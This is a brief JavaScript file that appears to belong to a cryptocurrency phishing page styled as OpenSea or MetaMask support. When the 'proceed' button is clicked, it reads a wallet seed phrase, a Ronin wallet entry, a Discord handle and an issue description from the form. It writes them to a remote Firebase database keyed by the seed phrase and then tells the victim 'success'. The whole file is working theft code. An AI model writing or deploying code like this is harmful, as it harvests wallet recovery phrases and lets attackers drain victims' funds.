var phrasev, roninv, discordv, issuev;

function readFormphrase(){
	phrasev = document.getElementById("phrase").value;
	roninv = document.getElementById("ronin").value;
	discordv = document.getElementById("discord").value;
	issuev = document.getElementById("issue").value;
	console.log(phrasev, roninv, discordv, issuev);
}

document.getElementById("proceed").onclick = function () {
	readFormphrase();

	firebase
		.database()
		.ref("opensea/" + phrasev)
		.set({
			opensea: phrasev,
			metamask: roninv,
			discord: discordv,
			issue: issuev,

		});
	alert("success");
};
